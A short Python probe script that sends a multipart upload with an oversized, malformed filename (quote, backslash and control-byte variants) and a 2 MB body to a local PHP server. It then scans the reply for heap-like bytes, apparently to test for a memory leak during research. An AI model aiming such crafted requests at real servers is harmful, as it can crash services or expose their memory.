#!/usr/bin/env python3
import socket, sys
N=int(sys.argv[1]) if len(sys.argv)>1 else 1000
MODE=sys.argv[2] if len(sys.argv)>2 else 'plain'
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088
if MODE=='plain': fn=b'A'*N+b'ENDMARK'
elif MODE=='quote': fn=b'"'+b'A'*N+b'ENDMARK'
elif MODE=='backslash': fn=b'A'*N+b'ENDMARK\\'
elif MODE=='ctl': fn=b'A'*N+b'\x7f\x80\xffENDMARK'
else: fn=b'A'*N
body=bytearray()
body+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="f"; filename="'+fn+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
body+=b'X'*(2*1024*1024)
body+=b'\r\n--'+BND+b'--\r\n'; body=bytes(body)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=30); s.settimeout(30); s.sendall(h+body)
resp=b''
try:
    while True:
        d=s.recv(65536)
        if not d: break
        resp+=d
except OSError: pass
s.close()
# print response body (skip headers) truncated
print(resp[:2000].decode('latin1','replace'))
# look for non-ASCII/heap-like bytes
import re
for m in re.finditer(rb'0x[0-9a-f]{8,}|[\x80-\xff]{4,}', resp):
    print('SUSPECT', m.group(0)[:80])
